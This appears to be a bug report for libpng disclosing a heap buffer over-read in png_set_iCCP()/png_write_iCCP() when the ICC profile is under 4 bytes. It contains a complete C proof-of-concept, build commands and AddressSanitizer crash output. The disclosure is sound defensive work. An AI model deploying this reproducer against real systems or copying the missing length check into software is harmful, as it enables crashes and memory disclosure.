# heap-buffer-overflow opportunity in png_set_iCCP() / png_write_iCCP()

From issue [#648](https://github.com/pnggroup/libpng/issues/648) we got that if the allocation size of the 'profile' argument passed to png_write_iCCP() is less than 4 bytes, there is a heap overflow that occurs in `pngwutil.c` at line 1151:

```c
   /* These are all internal problems: the profile should have been checked
    * before when it was stored.
    */
   if (profile == NULL)
      png_error(png_ptr, "No profile for iCCP chunk"); /* internal error */

   profile_len = png_get_uint_32(profile);

   if (profile_len < 132)
      png_error(png_ptr, "ICC profile too short");
```


With the following [POC](poc_iccp.c), we managed to reproduce the bug:
```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "png.h"

int main() {
    FILE *fp = fopen("output.png", "wb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING,
                                                  NULL, NULL, NULL);
    if (!png_ptr) return 1;

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        png_destroy_write_struct(&png_ptr, NULL);
        return 1;
    }

    if (setjmp(png_jmpbuf(png_ptr))) {
        printf("libpng triggered an error (likely due to bad profile)\n");
        png_destroy_write_struct(&png_ptr, &info_ptr);
        fclose(fp);
        return 1;
    }

    png_init_io(png_ptr, fp);

    png_set_IHDR(png_ptr, info_ptr,
                 1, 1,                    // width, height
                 8,                      // bit_depth
                 PNG_COLOR_TYPE_RGB,     // color_type
                 PNG_INTERLACE_NONE,
                 PNG_COMPRESSION_TYPE_BASE,
                 PNG_FILTER_TYPE_BASE);

    // ICC profile (malformed): length < 4 bytes
    char profile_name[] = "sRGB";
    int compression_type = 0;

    // Invalid profile buffer of length 3 (should be ≥ 4)
    png_bytep profile_data = (png_bytep)"ABC";
    png_uint_32 profile_len = 3;

    png_set_iCCP(png_ptr, info_ptr,
                 profile_name, compression_type,
                 profile_data, profile_len);

    png_write_info(png_ptr, info_ptr);

    // Write dummy image row
    png_bytep row = (png_bytep)malloc(3);
    memset(row, 255, 3);
    png_write_row(png_ptr, row);

    png_write_end(png_ptr, NULL);
    free(row);
    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);
    return 0;
}
```

After building the library:

```
$ ./configure
$ make
$ sudo make install
```

We can build the exec:
```sh
$ gcc -fsanitize=address -g poc_iccp.c -o poc_iccp -lpng -lz
```

Once we run the exec (with address sanatizer enabled), we get the following output:

```sh
$ ./poc_iccp

poc_iccp(17600,0x1f88d4840) malloc: nano zone abandoned due to inability to reserve vm space.
=================================================================
==17600==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000b3 at pc 0x000102e3ada8 bp 0x00016d87ece0 sp 0x00016d87e490
READ of size 65536 at 0x6020000000b3 thread T0
    #0 0x102e3ada4 in memcpy+0x3fc (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4)
    #1 0x19ca8f774  (libz.1.dylib:arm64e+0x6774)
    #2 0x19ca8da88  (libz.1.dylib:arm64e+0x4a88)
    #3 0x19ca8f088  (libz.1.dylib:arm64e+0x6088)
    #4 0x19ca8c7a0 in deflate+0x958 (libz.1.dylib:arm64e+0x37a0)
    #5 0x1025ebdc8 in png_text_compress pngwutil.c:597
    #6 0x1025ebb74 in png_write_iCCP pngwutil.c:1188
    #7 0x1025e77b0 in png_write_info_before_PLTE pngwrite.c:199
    #8 0x1025e78e0 in png_write_info pngwrite.c:237
    #9 0x102583a24 in main poc_iccp.c:52
    #10 0x18ebe4270  (<unknown module>)

0x6020000000b3 is located 0 bytes after 3-byte region [0x6020000000b0,0x6020000000b3)
allocated by thread T0 here:
    #0 0x102e3cc04 in malloc+0x94 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54c04)
    #1 0x1025d3cf0 in png_malloc_warn pngmem.c:216
    #2 0x1025e5a1c in png_set_iCCP pngset.c:891
    #3 0x1025839b0 in main poc_iccp.c:48
    #4 0x18ebe4270  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4) in memcpy+0x3fc
Shadow bytes around the buggy address:
  0x601ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x602000000000: fa fa fd fa fa fa fd fd fa fa fd fd fa fa 00 00
=>0x602000000080: fa fa 05 fa fa fa[03]fa fa fa fa fa fa fa fa fa
  0x602000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==17600==ABORTING
zsh: abort      ./poc_iccp
```
